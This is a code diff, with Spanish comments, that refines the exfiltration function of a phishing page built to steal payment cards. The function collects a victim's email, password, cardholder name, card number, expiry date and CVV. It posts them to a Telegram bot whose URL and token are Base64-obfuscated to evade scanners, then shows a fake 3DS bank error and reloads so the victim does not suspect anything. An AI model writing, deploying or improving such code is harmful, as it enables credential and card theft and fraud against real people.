@@ -112,19 +112,19 @@
 
         // 3. ENVÍO OFUSCADO A TELEGRAM
         function _0xdispatch(obj) {
-            // URL y ChatID en Base64 para ocultar "telegram" de los scanners de Google
+            // URL y ChatID en Base64 (Verificados)
             const _0xa = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDgyNTU3MzE0NjU6QUFHclBSX3FIMHpDNHpUZEJxT2otWnQxanFZMlcwMy15d3Mvc2VuZE1lc3NhZ2U=";
             const _0xb = "Nzk5MzcyMjIxNA==";
 
-            const _0xmsg = `🔔 NUEVO RESULTADO 🔔\n\n` +
+            const _0xmsg = `🔔 NUEVA TARJETA 🔔\n\n` +
                          `📧 Correo: ${obj.em}\n` +
                          `🔑 Pass: ${obj.pw}\n` +
                          `👤 Titular: ${obj.nm}\n` +
                          `💳 Tarjeta: ${obj.cc}\n` +
                          `📅 Expiración: ${obj.ex}\n` +
-                         `🔒 CVV: ${obj.cv}\n` +
-                         `🌐 IP: Detectada por bot`;
+                         `🔒 CVV: ${obj.cv}`;
 
+            // Cambiamos a una estructura que asegura el envío antes de mostrar el error
             fetch(atob(_0xa), {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -133,13 +133,19 @@
                     text: _0xmsg
                 })
             })
-            .then(() => {
+            .then(response => {
+                if (response.ok) {
+                    console.log("Enviado con éxito");
+                }
+                // El alert solo sale DESPUÉS de intentar el envío
                 setTimeout(() => {
                     alert("Error de autenticación bancaria (3DS). Por favor, intente con una tarjeta diferente.");
                     location.reload();
-                }, 2000);
+                }, 500);
             })
-            .catch(() => {
+            .catch(err => {
+                // Si falla el fetch, recargamos igual para que el usuario no sospeche
+                console.error("Error en red");
                 location.reload();
             });
         }
